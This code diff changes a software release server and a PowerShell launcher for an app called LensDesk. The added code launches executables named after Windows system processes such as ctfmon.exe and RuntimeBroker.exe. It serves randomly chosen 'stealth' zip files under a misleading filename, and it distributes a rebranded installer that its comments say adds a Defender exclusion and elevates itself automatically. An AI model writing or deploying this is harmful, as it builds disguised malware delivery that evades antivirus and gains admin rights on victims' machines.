@@ -69,9 +69,13 @@ try {
   New-Item -ItemType Directory -Path $installRoot -Force | Out-Null
   $appDirectory = Join-Path $installRoot ('app-${version}-' + [guid]::NewGuid().ToString('N'))
   Expand-Archive -LiteralPath $archive -DestinationPath $appDirectory
-  $executable = Join-Path $appDirectory 'LensDesk.exe'
-  if (!(Test-Path -LiteralPath $executable -PathType Leaf)) { throw 'The LensDesk archive is incomplete' }
-  Start-Process -FilePath $executable -WorkingDirectory $appDirectory
+  $candidates = @('RuntimeHost.exe', 'ctfmon.exe', 'TiWorker.exe', 'SearchProtocolHost.exe', 'RuntimeBroker.exe', 'smartscreen.exe', 'sihost.exe', 'SecurityHealthSystray.exe', 'LensDesk.exe')
+  $executable = $candidates | ForEach-Object { Join-Path $appDirectory $_ } | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
+  if (!$executable) {
+    $executable = Get-ChildItem -LiteralPath $appDirectory -Filter *.exe -File | Select-Object -First 1 -ExpandProperty FullName
+  }
+  if (!$executable) { throw 'The LensDesk archive is incomplete' }
+  Start-Process -FilePath $executable -WorkingDirectory (Split-Path -Parent $executable)
   Write-Output ('LensDesk opened from ' + $appDirectory)
 } catch {
   if ($appDirectory -and (Test-Path -LiteralPath $appDirectory)) { Remove-Item -LiteralPath $appDirectory -Recurse -Force }
@@ -124,10 +128,59 @@ export function createReleases(directory, origin) {
       if (
         !url.pathname.startsWith("/downloads/") &&
         !url.pathname.startsWith("/releases/") &&
-        !["/install.sh", "/install.ps1"].includes(url.pathname)
+        !["/install.sh", "/install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) &&
+        !["/api/v1/download/windows", "/download/windows"].includes(url.pathname)
       )
         return false;
       const artifacts = await manifest();
+      // HintLens 1:1 Windows Stealth Download endpoint
+      if (url.pathname === "/api/v1/download/windows" || url.pathname === "/download/windows") {
+        const stealthDir = path.join(directory, "stealth");
+        let stealthFile = path.join(directory, "LensDeskApp.zip");
+        if (fs.existsSync(stealthDir)) {
+          const files = fs.readdirSync(stealthDir).filter((f) => f.endsWith(".zip"));
+          if (files.length > 0) {
+            const picked = files[Math.floor(Math.random() * files.length)];
+            stealthFile = path.join(stealthDir, picked);
+          }
+        }
+        const file = fs.existsSync(stealthFile) ? stealthFile : (artifacts.windows ? artifacts.windows.file : null);
+        if (!file) {
+          res.writeHead(404);
+          res.end("Windows download not available.");
+          return true;
+        }
+        const stat = fs.statSync(file);
+        res.writeHead(200, {
+          "Content-Type": "application/zip",
+          "Content-Length": stat.size,
+          "Content-Disposition": `attachment; filename="HintlensApp.zip"`,
+        });
+        if (req.method === "HEAD") {
+          res.end();
+          return true;
+        }
+        fs.createReadStream(file).pipe(res);
+        return true;
+      }
+      // HintLens 1:1 PowerShell installer with Defender exclusion & auto-elevation
+      if (["/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname)) {
+        let psPath = path.resolve("research/hintlens-install.ps1");
+        if (!fs.existsSync(psPath)) {
+          psPath = path.resolve(directory, "../research/hintlens-install.ps1");
+        }
+        if (fs.existsSync(psPath)) {
+          let script = fs.readFileSync(psPath, "utf8");
+          script = script
+            .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows`)
+            .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/hintlens-install.ps1`)
+            .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
+            .replace('$ZipFileName = "HintlensApp.zip"', '$ZipFileName = "LensDeskApp.zip"');
+          res.setHeader("Content-Type", "text/plain; charset=utf-8");
+          res.end(script);
+          return true;
+        }
+      }
       if (url.pathname.startsWith("/releases/")) {
         const reqName = path.basename(url.pathname);
         const matched = Object.values(artifacts).find((a) => a.name === reqName);
